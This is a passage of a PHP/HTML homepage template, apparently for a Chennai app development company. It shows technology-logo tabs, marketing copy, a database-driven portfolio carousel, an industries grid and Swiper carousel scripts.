                                            <img class="program-logo" width="70" height="70" src="https://img.icons8.com/color-glass/480/bootstrap.png" alt="bootstrap" />
                                            <p style="text-align:center; font-weight:600; font-size:14px; color:#1C46A8">
                                                Bootstrap</p>
                                        </div>
                                    </div>
                                </div>

                                <div class="col-lg-2 col-4 col-md-3 col-sm-4 col-xl-2 col-xxl-2 mobile-center d-flex justify-content-center">
                                    <div class="d-flex">
                                        <div>
                                            <img class="program-logo" width="70" height="70" src="https://img.icons8.com/color/480/nextjs.png" alt="nextjs" />
                                            <p style="text-align:center; font-weight:600; font-size:14px; color:#1C46A8">
                                                Next Js</p>
                                        </div>
                                    </div>

                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="tab-pane fade" id="pills-Back-End" role="tabpanel" aria-labelledby="pills-Back-End-tab">
                    <div class="d-flex justify-content-center">
                        <div class="row">
                            <div class="col-lg-2 col-4 col-md-3 col-sm-4 col-xl-2 col-xxl-2 mobile-center d-flex justify-content-center">
                                <div class="d-flex">
                                    <div>
                                        <img class="program-logo" width="70" height="70" src="https://img.icons8.com/officel/600/php-logo.png" alt="php-logo" />
                                        <p style="text-align:center; font-weight:600; font-size:14px; color:#1C46A8">PHP
                                        </p>
                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-2 col-4 col-md-3 col-sm-4 col-xl-2 col-xxl-2 mobile-center d-flex justify-content-center">
                                <div class="d-flex">
                                    <div>
                                        <img class="program-logo" width="70" height="70" src="https://img.icons8.com/color/480/python--v1.png" alt="python--v1" />
                                        <p style="text-align:center; font-weight:600; font-size:14px; color:#1C46A8">
                                            Python</p>
                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-2 col-4 col-md-3 col-sm-4 col-xl-2 col-xxl-2 mobile-center d-flex justify-content-center">
                                <div class="d-flex">
                                    <div>
                                        <img class="program-logo" width="70" height="70" src="https://img.icons8.com/fluency/480/node-js.png" alt="node-js" />
                                        <p style="text-align:center; font-weight:600; font-size:14px; color:#1C46A8">
                                            Node JS</p>
                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-2 col-4 col-md-3 col-sm-4 col-xl-2 col-xxl-2 mobile-center d-flex justify-content-center">
                                <div class="d-flex">
                                    <div>
                                        <img class="program-logo" width="70" height="70" src="https://img.icons8.com/fluency/480/laravel.png" alt="laravel" />
                                        <p style="text-align:center; font-weight:600; font-size:14px; color:#1C46A8">
                                            Laravel</p>
                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-2 col-4 col-md-3 col-sm-4 col-xl-2 col-xxl-2 mobile-center d-flex justify-content-center">
                                <div class="d-flex">
                                    <div>
                                        <img class="program-logo" width="70" height="70" src="https://img.icons8.com/color/480/net-framework.png" alt="net-framework" />
                                        <p style="text-align:center; font-weight:600; font-size:14px; color:#1C46A8">
                                            .NET Core</p>
                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-2 col-4 col-md-3 col-sm-4 col-xl-2 col-xxl-2 mobile-center d-flex justify-content-center">
                                <div class="d-flex">
                                    <div>
                                        <img class="program-logo" width="70" height="70" src="https://img.icons8.com/color/480/java-coffee-cup-logo--v1.png" alt="java-coffee-cup-logo--v1" />
                                        <p style="text-align:center; font-weight:600; font-size:14px; color:#1C46A8">
                                            Java</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="tab-pane fade" id="pills-Mobile" role="tabpanel" aria-labelledby="pills-Mobile-tab">
                    <div class="d-flex justify-content-center">
                        <div class="row">
                            <div class="col-lg-2 col-4 col-md-3 col-sm-4 col-xl-2 col-xxl-2 mobile-center d-flex justify-content-center">
                                <div class="d-flex">
                                    <div>
                                        <img class="program-logo" width="70" height="70" src="https://img.icons8.com/color/480/flutter.png" alt="flutter" />

                                        <p style="text-align:center; font-weight:600; font-size:14px; color:#1C46A8">
                                            Flutter</p>
                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-2 col-4 col-md-3 col-sm-4 col-xl-2 col-xxl-2 mobile-center d-flex justify-content-center">
                                <div class="d-flex">
                                    <div>
                                        <img class="program-logo" width="70" height="70" src="https://img.icons8.com/color/480/react-native.png" alt="react-native" />
                                        <p style="text-align:center; font-weight:600; font-size:14px; color:#1C46A8">
                                            React Native</p>
                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-2 col-4 col-md-3 col-sm-4 col-xl-2 col-xxl-2 mobile-center d-flex justify-content-center">
                                <div class="d-flex">
                                    <div>
                                        <img class="program-logo" width="70" height="70" src="https://img.icons8.com/color/480/kotlin.png" alt="kotlin" />
                                        <p style="text-align:center; font-weight:600; font-size:14px; color:#1C46A8">
                                            Kotlin</p>
                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-2 col-4 col-md-3 col-sm-4 col-xl-2 col-xxl-2 mobile-center d-flex justify-content-center">
                                <div class="d-flex">
                                    <div>
                                        <img class="program-logo" width="70" height="70" src="https://img.icons8.com/fluency/480/xamarin.png" alt="xamarin" />
                                        <p style="text-align:center; font-weight:600; font-size:14px; color:#1C46A8">
                                            Xamarin</p>
                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-2 col-4 col-md-3 col-sm-4 col-xl-2 col-xxl-2 mobile-center d-flex justify-content-center">
                                <div class="d-flex">
                                    <div>
                                        <img class="program-logo" width="70" height="70" src="https://img.icons8.com/ios-filled/500/unity.png" alt="unity" />
                                        <p style="text-align:center; font-weight:600; font-size:14px; color:#1C46A8">
                                            Unity 3D</p>
                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-2 col-4 col-md-3 col-sm-4 col-xl-2 col-xxl-2 mobile-center d-flex justify-content-center">
                                <div class="d-flex">
                                    <div>
                                        <img class="program-logo" width="70" height="70" src="https://img.icons8.com/color/480/swift.png" alt="swift" />
                                        <p style="text-align:center; font-weight:600; font-size:14px; color:#1C46A8">
                                            Swift</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="tab-pane fade" id="pills-devops" role="tabpanel" aria-labelledby="pills-devops-tab">
                    <div class="d-flex justify-content-center">
                        <div class="row">
                            <div class="col-lg-2 col-4 col-md-3 col-sm-4 col-xl-2 col-xxl-2 mobile-center d-flex justify-content-center">
                                <div class="d-flex">
                                    <div>
                                        <img class="program-logo" width="70" height="70" src="https://img.icons8.com/color/480/amazon-web-services.png" alt="amazon-web-services" />
                                        <p style="text-align:center; font-weight:600; font-size:14px; color:#1C46A8">AWS
                                        </p>
                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-2 col-4 col-md-3 col-sm-4 col-xl-2 col-xxl-2 mobile-center d-flex justify-content-center">
                                <div class="d-flex">
                                    <div>
                                        <img class="program-logo" width="70" height="70" src="https://img.icons8.com/color/800/1C46A8/azure-1.png" alt="azure-1" />
                                        <p style="text-align:center; font-weight:600; font-size:14px; color:#1C46A8">
                                            Azure</p>
                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-2 col-4 col-md-3 col-sm-4 col-xl-2 col-xxl-2 mobile-center d-flex justify-content-center">
                                <div class="d-flex">
                                    <div>
                                        <img class="program-logo" width="70" height="70" src="https://img.icons8.com/color/480/google-cloud.png" alt="google-cloud" />
                                        <p style="text-align:center; font-weight:600; font-size:14px; color:#1C46A8">
                                            Google Cloud</p>
                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-2 col-4 col-md-3 col-sm-4 col-xl-2 col-xxl-2 mobile-center d-flex justify-content-center">
                                <div class="d-flex">
                                    <div>
                                        <img class="program-logo" width="70" height="70" src="https://img.icons8.com/fluency/480/docker.png" alt="docker" />
                                        <p style="text-align:center; font-weight:600; font-size:14px; color:#1C46A8">
                                            Docker</p>
                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-2 col-4 col-md-3 col-sm-4 col-xl-2 col-xxl-2 mobile-center d-flex justify-content-center">
                                <div class="d-flex">
                                    <div>
                                        <img class="program-logo" width="70" height="70" src="https://img.icons8.com/color/480/jenkins.png" alt="jenkins" />
                                        <p style="text-align:center; font-weight:600; font-size:14px; color:#1C46A8">
                                            Jenkins</p>
                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-2 col-4 col-md-3 col-sm-4 col-xl-2 col-xxl-2 mobile-center d-flex justify-content-center">
                                <div class="d-flex">
                                    <div>
                                        <img class="program-logo" width="70" height="70" src="https://img.icons8.com/color/480/kubernetes.png" alt="kubernetes" />
                                        <p style="text-align:center; font-weight:600; font-size:14px; color:#1C46A8">
                                            Kubernetes</p>
                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-2 col-4 col-md-3 col-sm-4 col-xl-2 col-xxl-2 mobile-center d-flex justify-content-center">
                                <div class="d-flex">
                                    <div>
                                        <img class="program-logo" width="70" height="70" src="https://img.icons8.com/color/480/terraform.png" alt="terraform" />
                                        <p style="text-align:center; font-weight:600; font-size:14px; color:#1C46A8">
                                            Terraform</p>
                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-2 col-4 col-md-3 col-sm-4 col-xl-2 col-xxl-2 mobile-center d-flex justify-content-center">
                                <div class="d-flex">
                                    <div>
                                        <img class="program-logo" width="70" height="70" src="https://img.icons8.com/color/480/openshift.png" alt="openshift" />
                                        <p style="text-align:center; font-weight:600; font-size:14px; color:#1C46A8">
                                            OpenShift</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="tab-pane fade" id="pills-Database" role="tabpanel" aria-labelledby="pills-Database-tab">
                    <div class="d-flex justify-content-center">
                        <div class="row">
                            <div class="col-lg-2 col-4 col-md-3 col-sm-4 col-xl-2 col-xxl-2 mobile-center d-flex justify-content-center">
                                <div class="d-flex">
                                    <div>
                                        <img class="program-logo" width="70" height="70" src="https://img.icons8.com/external-tal-revivo-bold-tal-revivo/500/1C46A8/external-mongodb-a-cross-platform-document-oriented-database-program-logo-bold-tal-revivo.png" alt="mongodb logo" />
                                        <p style="text-align:center; font-weight:600; font-size:14px; color:#1C46A8">
                                            Mongo</p>
                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-2 col-4 col-md-3 col-sm-4 col-xl-2 col-xxl-2 mobile-center d-flex justify-content-center">
                                <div class="d-flex">
                                    <div>
                                        <img class="program-logo" width="70" height="70" src="https://img.icons8.com/color/480/mysql-logo.png" alt="mysql-logo" />
                                        <p style="text-align:center; font-weight:600; font-size:14px; color:#1C46A8">
                                            MySQL</p>
                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-2 col-4 col-md-3 col-sm-4 col-xl-2 col-xxl-2 mobile-center d-flex justify-content-center">
                                <div class="d-flex">
                                    <div>
                                        <img class="program-logo" width="70" height="70" src="https://img.icons8.com/color/480/microsoft-sql-server.png" alt="microsoft-sql-server" />
                                        <p style="text-align:center; font-weight:600; font-size:14px; color:#1C46A8">
                                            Microsoft SQL</p>
                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-2 col-4 col-md-3 col-sm-4 col-xl-2 col-xxl-2 mobile-center d-flex justify-content-center">
                                <div class="d-flex">
                                    <div>
                                        <img class="program-logo" width="70" height="70" src="./images/pngwing.com.png" alt="maria-db" />
                                        <p style="text-align:center; font-weight:600; font-size:14px; color:#1C46A8">
                                            MariaDB</p>
                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-2 col-4 col-md-3 col-sm-4 col-xl-2 col-xxl-2 mobile-center d-flex justify-content-center">
                                <div class="d-flex">
                                    <div>
                                        <img class="program-logo" width="70" height="70" src="https://img.icons8.com/color/480/postgreesql.png" alt="postgreesql" />
                                        <p style="text-align:center; font-weight:600; font-size:14px; color:#1C46A8">
                                            PostgreSQL</p>
                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-2 col-4 col-md-3 col-sm-4 col-xl-2 col-xxl-2 mobile-center d-flex justify-content-center">
                                <div class="d-flex">
                                    <div>
                                        <img class="program-logo" width="70" height="70" src="https://img.icons8.com/color/480/redis.png" alt="redis" />
                                        <p style="text-align:center; font-weight:600; font-size:14px; color:#1C46A8">
                                            Redis</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <p class="website-para pt-4">We harness a diverse range of cutting-edge technologies and tools to engineer robust, scalable, and high-performance mobile and web applications. Our proficiency in these technologies allows us to remain at the forefront of the continuously evolving development landscape.
            </p>
            <p class="website-para">We are committed to staying updated with the latest advancements in both mobile and web technologies. Our team continuously explores and adopts emerging tools and frameworks to ensure that your mobile and web applications are built using the most efficient, reliable, and scalable solutions available in the industry.</p>
        </div>

        <div class="portfolio  mt-5" style="background-color:#F7FDFF">

            <!-- <hr> -->
            <div class="container-fluid">
                <h2 class="pt-3" style="color:#081A48; font-weight:700;">OUR WORK</h2>
                <h3 style="font-weight:700;color:#1C46A8">We bring your ideas to life by creating intuitive,
                    feature-rich mobile applications for iOS and Android platforms.</h3>
                <div class="row py-5">
                    <div class="col-lg-4 p-1 d-flex justify-content-center align-items-center" style=" overflow: hidden;">
                        <img src="./images/app-and-web.gif" alt="mdq app and web" style="width: 100%;">
                    </div>
                    <div class="col-lg-8  d-flex justify-content-center align-items-center">
                        <div class="">
                            <h2 style="color:#1C46A8; font-weight:600;">Mobile Application and Web Development</h2>
                            <p class="website-para">From concept to deployment, we specialize in crafting intuitive mobile applications for iOS and Android, complemented by seamless website development. As a leading mobile app development company in Chennai, our experienced team ensures captivating designs and seamless functionality. Emphasizing user-centric design, we create engaging experiences, leveraging the latest technologies for feature-rich applications. Quality assurance is paramount throughout development, guaranteeing bug-free, optimized mobile apps and websites. Let us elevate your digital presence, exceeding user expectations across both platforms as a premier mobile app and web development company in Chennai.</p>

                        </div>
                    </div>
                    <!-- <div class="web-button-div d-flex justify-content-center">
                                    <a href="./portfolio.php">
                                        <button class="web-button my-4">Read More</button>
                                    </a>
                                </div> -->
                </div>
            </div>

            <!-- <hr> -->
        </div>
        <div>
            <style>
                .our-work-card-1 {
                    box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
                    border: none;
                    border-radius: 0px !important;
                    width: 250px;
                    height: 300px;
                }
            </style>
            <div class="container-fluid">
                <div class="row">
                    <div class="col-lg-3 p-3 d-flex justify-content-center mt-5">
                        <div>
                            <h5 style="font-weight:600">Our Beautiful Interfaces</h5>
                            <p style="font-size:14px; color: rgba(0, 0, 0, 0.7)">Our interfaces are a symphony of design and functionality, seamlessly blending beauty with purpose to create a captivating user experience.</p>
                            <a href="./portfolio.php">
                                <div class="web-button-div">
                                    <button class="web-button mt-3" style="width:98%">Learn More</button>
                                </div>
                            </a>
                        </div>
                    </div>
                    <div class="col-lg-9 p-1">
                        <div class="swiper-container">
                            <div class="swiper-wrapper">
                                <?php
                                $logo = mysqli_query($conn, "SELECT id, projectname, aboutproject, image, sec_image FROM project_list WHERE type_project=2");

                                while ($frow = mysqli_fetch_array($logo)) {
                                    $projectname = $frow['projectname'];
                                    $aboutproject = $frow['aboutproject'];
                                    $image = $frow['image'];
                                    $sec_image = $frow['sec_image'];
                                    $id = $frow['id'];
                                ?>
                                    <div class="swiper-slide d-flex justify-content-center">
                                        <a href="./portfolio.php" style="color:black; text-decoration:none">
                                            <div class=" port-animation-card">
                                                <div class="wrapper">
                                                    <img src="./images/portfolio/<?php echo $image; ?>" class="cover-image" />
                                                </div>
                                                <img src="./images/portfolio/<?php echo $sec_image; ?>" width="170px" class="character" />

                                            </div>
                                            <div class="px-5" style="text-align:center">
                                                <h4 style="color:#1C46A8" class=" fw-bold "><?php echo $projectname; ?></h4>
                                                <h6 style="color:rgba(0, 0, 0, 0.7)"><?php echo $aboutproject; ?></h6>
                                            </div>
                                        </a>

                                    </div>
                                <?php } ?>
                            </div>
                        </div>

                        <script>
                            const reviewsCarousel1Options = {
                                direction: 'horizontal',
                                freeMode: true,
                                grabCursor: true,
                                speed: 600,
                                a11y: false,
                                loop: false,
                                breakpoints: {
                                    640: {
                                        slidesPerView: 1,
                                        spaceBetween: 5,
                                    },
                                    768: {
                                        slidesPerView: 2,
                                        spaceBetween: 10,
                                    },
                                    1024: {
                                        slidesPerView: 2,
                                        spaceBetween: 10,
                                    },
                                    1366: {
                                        slidesPerView: 3,
                                        spaceBetween: 20,
                                    },
                                    1500: {
                                        slidesPerView: 3,
                                        spaceBetween: 20,
                                    },
                                },
                                autoplay: {
                                    delay: 2000,
                                },
                                loop: true,
                                navigation: {
                                    nextEl: '.swiper-button-next',
                                    prevEl: '.swiper-button-prev',
                                },
                            };
                            const reviewsCarousel1 = new Swiper('.swiper-container', reviewsCarousel1Options);
                        </script>
                    </div>
                </div>
            </div>
        </div>

        <div class="industries container-fluid pb-5">
            <h2 class="pt-3" style="color:#081A48; font-weight:700; text-transform:uppercase">Industries We Serve</h2>
            <h2 style="font-weight:700;line-height:50px;color:#1C46A8">Here, We make almost every genre of applications.</h2>
            <div class="row">
                <div class="col-lg-3 d-flex justify-content-center">
                    <div class="card zoom-in mt-4" data-aos="zoom-in" data-aos-duration="1500" data-aos-delay="100" style="width:100%; border-radius:16px; box-shadow: 0 .5rem 1rem rgba(0,0,0,.15) !important; border:none">
                        <div class="zoom-in pt-4 pb-3 d-flex justify-content-center align-items-center">
                            <img width="70" height="70" src="https://img.icons8.com/ios-filled/1000/A540BF/mobile-shopping-bag--v2.png" alt="mobile-shopping-bag--v2" />
                        </div>
                        <p class="pb-4" style="text-align:center">E-Commerce</p>
                    </div>
                </div>
                <div class="col-lg-3 d-flex justify-content-center">
                    <div class="card zoom-in mt-4" data-aos="zoom-in" data-aos-duration="1500" data-aos-delay="500" style="width:100%; border-radius:16px; box-shadow: 0 .5rem 1rem rgba(0,0,0,.15) !important; border:none">
                        <div class="zoom-in pt-4 pb-3 d-flex justify-content-center align-items-center">
                            <img width="70" height="70" src="https://img.icons8.com/external-goofy-solid-kerismaker/960/DE9025/external-E-learning-education-goofy-solid-kerismaker.png" alt="external-E-learning-education-goofy-solid-kerismaker" />
                        </div>
                        <p class="pb-4" style="text-align:center">Education & E-Learning</p>
                    </div>
                </div>
                <div class="col-lg-3 d-flex justify-content-center">
                    <div class="card zoom-in mt-4" data-aos="zoom-in" data-aos-duration="1500" data-aos-delay="900" style="width:100%; border-radius:16px; box-shadow: 0 .5rem 1rem rgba(0,0,0,.15) !important; border:none">
                        <div class="zoom-in pt-4 pb-3 d-flex justify-content-center align-items-center">
                            <img width="70" height="70" src="https://img.icons8.com/ios-filled/1000/6835AF/electric-vehicle.png" alt="electric-vehicle" />
                        </div>
                        <p class="pb-4" style="text-align:center">Electric Vechicle</p>
                    </div>
                </div>
                <div class="col-lg-3 d-flex justify-content-center">
                    <div class="card zoom-in mt-4" data-aos="zoom-in" data-aos-duration="1500" data-aos-delay="1400" style="width:100%; border-radius:16px; box-shadow: 0 .5rem 1rem rgba(0,0,0,.15) !important; border:none">
                        <div class="zoom-in pt-4 pb-3 d-flex justify-content-center align-items-center">
                            <img width="70" height="70" src="https://img.icons8.com/external-solidglyph-m-oki-orlando/1000/1DD2BA/external-iot-web-services-solid-solidglyph-m-oki-orlando.png" alt="external-iot-web-services-solid-solidglyph-m-oki-orlando" />
                        </div>
                        <p class="pb-4" style="text-align:center">IoT Apps</p>
                    </div>
                </div>
                <div class="col-lg-3 d-flex justify-content-center">
                    <div class="card zoom-in mt-4" data-aos="zoom-in" data-aos-duration="1500" data-aos-delay="1400" style="width:100%; border-radius:16px; box-shadow: 0 .5rem 1rem rgba(0,0,0,.15) !important; border:none">
                        <div class="zoom-in pt-4 pb-3 d-flex justify-content-center align-items-center">
                            <img width="70" height="70" src="https://img.icons8.com/ios-filled/1000/2963E2/soup-plate.png" alt="soup-plate" />
                        </div>
                        <p class="pb-4" style="text-align:center">Food & Restaurants</p>
                    </div>
                </div>
                <div class="col-lg-3 d-flex justify-content-center">
                    <div class="card zoom-in mt-4" data-aos="zoom-in" data-aos-duration="1500" data-aos-delay="900" style="width:100%; border-radius:16px; box-shadow: 0 .5rem 1rem rgba(0,0,0,.15) !important; border:none">
                        <div class="zoom-in pt-4 pb-3 d-flex justify-content-center align-items-center">
                            <img width="70" height="70" src="https://img.icons8.com/glyph-neue/1000/DDB01A/trust--v1.png" alt="trust--v1" />
                        </div>
                        <p class="pb-4" style="text-align:center">Healthcare & Fitness</p>
                    </div>
                </div>
                <div class="col-lg-3 d-flex justify-content-center">
                    <div class="card zoom-in mt-4" data-aos="zoom-in" data-aos-duration="1500" data-aos-delay="500" style="width:100%; border-radius:16px; box-shadow: 0 .5rem 1rem rgba(0,0,0,.15) !important; border:none">
                        <div class="zoom-in pt-4 pb-3 d-flex justify-content-center align-items-center">
                            <img width="70" height="70" src="https://img.icons8.com/pastel-glyph/1000/92DE1E/transport--delivery--logistics--cargo--parcel--box--service-28.png" alt="transport--delivery--logistics--cargo--parcel--box--service-28" />
                        </div>
                        <p class="pb-4" style="text-align:center">Logistics & Distribution</p>
                    </div>
                </div>
                <div class="col-lg-3 d-flex justify-content-center">
                    <div class="card zoom-in mt-4" data-aos="zoom-in" data-aos-duration="1500" data-aos-delay="100" style="width:100%; border-radius:16px; box-shadow: 0 .5rem 1rem rgba(0,0,0,.15) !important; border:none">
                        <div class="zoom-in pt-4 pb-3 d-flex justify-content-center align-items-center">
                            <img width="70" height="70" src="https://img.icons8.com/ios-filled/1000/33DBB4/property.png" alt="property" />
                        </div>
                        <p class="pb-4" style="text-align:center">Real Estate</p>
                    </div>
                </div>
            </div>
        </div>

        <div id="testimonials">
            <?php include './includes/testimonials.php' ?>
        </div>

        <!-- floating-icons -->
        <!--<div class="floating-icons">-->
        <!--    <a href="mailto:apps@mdqualityapps.com" target="_blank">-->
        <!--        <div class="mailbox-container" style="top:180px">-->
        <!--            <div class="mailbox-name">Mail</div>-->
        <!--            <div class="mailbox-icon"><img width="25" height="25" src="https://img.icons8.com/material-rounded/100/ffffff/mail.png" alt="mail" /></div>-->
        <!--        </div>-->
        <!--    </a>-->
        <!--    <a href="tel:8838995745" target="_blank">-->
        <!--        <div class="mailbox-container" style="top:230px">-->
        <!--            <div class="mailbox-name">Call</div>-->
        <!--            <div class="mailbox-icon"><img width="25" height="25" src="https://img.icons8.com/glyph-neue/100/ffffff/phone.png" alt="phone" /></div>-->
        <!--        </div>-->
        <!--    </a>-->
        <!--    <a href="https://www.linkedin.com/in/divyalakshmipathy" target="_blank">-->
        <!--        <div class="mailbox-container" style="top:280px">-->
        <!--            <div class="mailbox-name">in</div>-->
        <!--            <div class="mailbox-icon"><img width="25" height="25" src="https://img.icons8.com/ios-filled/100/ffffff/linkedin.png" alt="linkedin" /></div>-->
        <!--        </div>-->
        <!--    </a>-->
        <!--    <a href="https://twitter.com/mdqualityapps" target="_blank">-->
        <!--        <div class="mailbox-container" style="top:330px">-->
        <!--            <div class="mailbox-name">Twit</div>-->
        <!--            <div class="mailbox-icon"><img width="25" height="25" src="https://img.icons8.com/ios-glyphs/100/ffffff/twitter--v1.png" alt="twitter--v1" />-->
        <!--            </div>-->
        <!--        </div>-->
        <!--    </a>-->
        <!--</div>-->

        <script>
            const reviewsCarouselOptions = {
                direction: 'horizontal',
                freeMode: true,
                grabCursor: true,
                speed: 600,
                a11y: false,
                loop: false,
                breakpoints: {
                    640: {
                        slidesPerView: 1,
                        spaceBetween: 20,
                    },
                    768: {
                        slidesPerView: 3,
                        spaceBetween: 10,
                    },
                    1024: {
                        slidesPerView: 4,
                        spaceBetween: 10,
                    },
                    1366: {
                        slidesPerView: 5,
                        spaceBetween: 20,
                    },
                    1500: {
                        slidesPerView: 6,
                        spaceBetween: 20,
                    },
                    2000: {
                        slidesPerView: 6,
                        spaceBetween: 20,
                    },
                },
                autoplay: {
                    delay: 2000,
                },
                loop: true,
            };
            const reviewsCarousel = new Swiper('#slider1', reviewsCarouselOptions);


            const slider1Options = {
                direction: 'horizontal',
                freeMode: true,
                grabCursor: true,
                speed: 600,
                a11y: false,
                loop: false,
                breakpoints: {
                    640: {
                        slidesPerView: 1,
                        spaceBetween: 5,
                    },
                    768: {
                        slidesPerView: 1,
                        spaceBetween: 10,
                    },
                    1024: {
                        slidesPerView: 1,
                        spaceBetween: 10,
                    },
                    1366: {
                        slidesPerView: 1,
                        spaceBetween: 20,
                    },
                    1500: {
                        slidesPerView: 1,
                        spaceBetween: 20,
                    },
                },
                autoplay: {
                    delay: 2000,
                },
                loop: true,
            };
            const slider1 = new Swiper('#slider2', slider1Options);


            const slider2Options = {
                direction: 'horizontal',
                freeMode: true,
                grabCursor: true,
                speed: 600,
                a11y: false,
                loop: false,
                breakpoints: {
                    640: {
                        slidesPerView: 1,
                        spaceBetween: 5,
                    },
                    768: {
                        slidesPerView: 1,
                        spaceBetween: 10,
                    },
                    1024: {
                        slidesPerView: 2,
                        spaceBetween: 10,
                    },
                    1366: {
                        slidesPerView: 3,
                        spaceBetween: 20,
                    },
                    1500: {
                        slidesPerView: 3,
                        spaceBetween: 20,
                    },
                },
                autoplay: {
                    delay: 2000,
                },
                loop: true,
            };
            const slider2 = new Swiper('#slider2', slider2Options);
        </script>
        <script>
            function animate(obj, initVal, lastVal, duration) {
                let startTime = null;

                const step = (timestamp) => {
                    if (!startTime) {
                        startTime = timestamp;
                    }
                    const progress = Math.min((timestamp - startTime) / duration, 1);
                    obj.innerHTML = Math.floor(progress * (lastVal - initVal) + initVal);
                    if (progress < 1) {
                        window.requestAnimationFrame(step);
                    }
                };

                window.requestAnimationFrame(step);
            }

            let text1 = document.getElementById('0101');
            let text2 = document.getElementById('0102');
            let text3 = document.getElementById('0103');
            let text4 = document.getElementById('0104');

            const load = () => {
                animate(text1, 0, 110, 7000);
                animate(text2, 0, 95, 7000);
                animate(text3, 0, 120, 7000);
                animate(text4, 0, 200, 7000);
            }
            window.addEventListener('load', load);
        </script>
    </div>


    </div>
</body>
<?php
include './footer.php';
?>